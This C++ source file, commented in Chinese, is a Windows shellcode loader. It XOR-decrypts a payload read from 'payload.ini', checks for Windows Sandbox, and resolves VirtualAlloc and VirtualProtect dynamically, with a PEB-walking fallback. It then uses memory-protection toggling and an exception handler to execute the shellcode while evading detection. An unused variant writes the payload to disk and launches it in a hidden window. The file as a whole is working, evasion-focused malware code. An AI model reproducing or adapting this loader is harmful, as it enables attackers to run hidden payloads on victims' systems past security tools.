#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>
#include <time.h>

#include "detect.h"

using namespace std;
using ll = long long;

ll shellcode_size = 0;

bool readFile(const string& filename, vector<unsigned char>& key, vector<unsigned char>& encryptedData) {
    ifstream file(filename, ios::binary);
    if (!file.is_open()) {
        cerr << "无法打开文件: " << filename << endl;
        return false;
    }

    key.resize(16);
    file.read(reinterpret_cast<char*>(key.data()), 16);  
    encryptedData.assign((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    return true;
}

void writeBinaryFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile) {
        std::cerr << "无法打开文件进行写入：" << filename << std::endl;
        return;
    }
    outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
    outFile.close();
}




vector<unsigned char> xorDecrypt(const vector<unsigned char>& encryptedData, const vector<unsigned char>& key) {
    vector<unsigned char> decryptedData(encryptedData.size());
    size_t key_len = key.size();

    for (size_t i = 0; i < encryptedData.size(); ++i) {
        decryptedData[i] = encryptedData[i] ^ key[i % key_len]; 
    }

    return decryptedData;
}

void detect_sandbox()
{
    try {
        if (wsb_detect_username() || wsb_detect_proc() || wsb_detect_suffix() ||
            wsb_detect_dev() || wsb_detect_genuine() || wsb_detect_cmd() ||
            wsb_detect_time() || wsb_detect_state_dev()) {
            throw std::runtime_error("windows 沙箱被检测");
        }
    }
    catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
}

namespace getImportAddress {

    typedef FARPROC(WINAPI* pGetProcAddress)(
        _In_ HMODULE hModule,
        _In_ LPCSTR lpProcName
        );

    typedef BOOL(WINAPI* pVirtualProtect) (
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
        );

    typedef LPVOID(WINAPI* pVirtualAlloc)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect
        );

    // 1. 获取kernel32的地址
    /*
        如果使用的是 非Intel C++ 编译器，注释该函数
        如果系统启用ASLR，注释该函数
        否则，使用以下代码获取kernel32的地址
    */
    DWORD GetKernel32Address() {
        DWORD dwKernel32Addr = 0;
        _asm {
            mov eax, fs: [0x30]
            mov eax, [eax + 0x0c]
            mov eax, [eax + 0x14]
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]
            mov dwKernel32Addr, eax
        }
        return    dwKernel32Addr;
    }

    DWORD RGetProcAddress() {
        //获取kernel32的地址
        DWORD dwAddrBase = GetKernel32Address();
        //获取Dos头
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwAddrBase;
        //获取Nt头 Nt头=dll基址+Dos头
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + dwAddrBase);
        //数据目录表                            扩展头 数据目录表 + 导出表    定位导出表
        PIMAGE_DATA_DIRECTORY pDataDir = pNt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
        //导出表
        //导出表地址
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dwAddrBase + pDataDir->VirtualAddress);
        //函数总数
        DWORD dwFunCount = pExport->NumberOfFunctions;
        //函数名称数量
        DWORD dwFunNameCount = pExport->NumberOfNames;
        //函数地址
        PDWORD pAddrOfFun = (PDWORD)(pExport->AddressOfFunctions + dwAddrBase);
        //函数名称地址
        PDWORD pAddrOfNames = (PDWORD)(pExport->AddressOfNames + dwAddrBase);
        //序号表
        PWORD pAddrOfOrdinals = (PWORD)(pExport->AddressOfNameOrdinals + dwAddrBase);
        //遍历函数总数
        for (size_t i = 0; i < dwFunCount; i++)
        {
            //判断函数地址是否存在
            if (!pAddrOfFun[i])
            {
                continue;
            }
            //通过函数地址遍历函数名称地址，获取想要的函数
            DWORD dwFunAddrOffset = pAddrOfFun[i];
            for (size_t j = 0; j < dwFunNameCount; j++)
            {
                if (pAddrOfOrdinals[j] == i)
                {
                    DWORD dwNameOffset = pAddrOfNames[j];
                    char* pFunName = (char*)(dwAddrBase + dwNameOffset);
                    if (strcmp(pFunName, "GetProcAddress") == 0)
                    {
                        return dwFunAddrOffset + dwAddrBase;
                    }
                }
            }
        }
    }

    HMODULE gethKernal32() {
        //static HMODULE hKernel32 = (HMODULE)GetKernel32Address();
        static HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
        return hKernel32;
    }
    

    pVirtualAlloc getVirtualAlloc() {
           //static pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)((pGetProcAddress)RGetProcAddress())(gethKernal32(), "VirtualAlloc");
           static pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)GetProcAddress(gethKernal32(), "VirtualAlloc");
           return funcVirtualAlloc;
    }

    pVirtualProtect getVirtualProtect() {
        //static pVirtualProtect funcVirtualProtect = (pVirtualProtect)((pGetProcAddress)RGetProcAddress())(gethKernal32(), "VirtualProtect");
        static pVirtualProtect funcVirtualProtect = (pVirtualProtect)GetProcAddress(gethKernal32(), "VirtualProtect");
        return funcVirtualProtect;
    }

}

namespace ExceptionHandle {
    void ExceptionHandler(EXCEPTION_POINTERS* pException) {
        if (pException->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
            LPVOID faultingAddress = (LPVOID)pException->ExceptionRecord->ExceptionInformation[1]; // 访问的地址
            DWORD oldProtect;

            if (getImportAddress::getVirtualProtect()(faultingAddress, shellcode_size, PAGE_EXECUTE, &oldProtect)) {
                std::cout << "页面权限已修改为可执行！" << std::endl;
            }
        }
    }
}



int intruder() {
    char path[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, (LPWSTR)path);
    std::cout << "当前工作目录: " << path << std::endl;
    string filename = "payload.ini";
    vector<unsigned char> key, encryptedData;
    if (!readFile(filename, key, encryptedData)) {
        return 1;
    }
    vector<unsigned char> decryptedData = xorDecrypt(encryptedData, key);

    /*cout << "payload: ";
    for (unsigned char byte : decryptedData) {
        cout << hex <<std::setw(2)<<std::setfill('0')<< static_cast<int>(byte) << " ";
    }
    cout << endl;*/
    std::cout << "payload 开始执行:" << std::endl;
    int a;
    auto b = (void(*)())(getImportAddress::getVirtualAlloc()(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    memcpy(b, decryptedData.data(), decryptedData.size());
    DWORD oldProtect;
    shellcode_size = decryptedData.size();
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
    Sleep(5);
  
    //(getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    detect_sandbox();

    __try {
        b();
    }
    __except (ExceptionHandle::ExceptionHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
        std::cout << "已将页面设置为可执行！" << std::endl;
        b();
    }
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
    return 0;
}

// 这个没有用
int intruderExe() {
    char path[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, (LPWSTR)path);
    std::cout << "当前工作目录: " << path << std::endl;
    string filename = "payload.ini";
    vector<unsigned char> key, encryptedData;
    if (!readFile(filename, key, encryptedData)) {
        return 1;
    }
    vector<unsigned char> decryptedData = xorDecrypt(encryptedData, key);
    std::string outputFilename = "shellcode.bin";
    writeBinaryFile(outputFilename, decryptedData);
    /*cout << "payload: ";
    for (unsigned char byte : decryptedData) {
        cout << hex <<std::setw(2)<<std::setfill('0')<< static_cast<int>(byte) << " ";
    }
    cout << endl;*/
    std::cout << "payload 开始执行:" << std::endl;
    /*int a;
    auto b = (void(*)())(getImportAddress::getVirtualAlloc()(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    memcpy(b, decryptedData.data(), decryptedData.size());
    DWORD oldProtect;
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
    Sleep(5);*/

    //(getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    detect_sandbox();

    /*__try {
        b();
    }
    __except (ExceptionHandle::ExceptionHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
        std::cout << "已将页面设置为可执行！" << std::endl;
        b();
    }
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));*/
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // 初始化 STARTUPINFO 结构体
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // 初始化 PROCESS_INFORMATION 结构体
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess((const WCHAR*)outputFilename.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    return 0;
}



int main()
{
    detect_sandbox();
    //intruder(); 
    intruder();
    while (1);
    return 0;
}
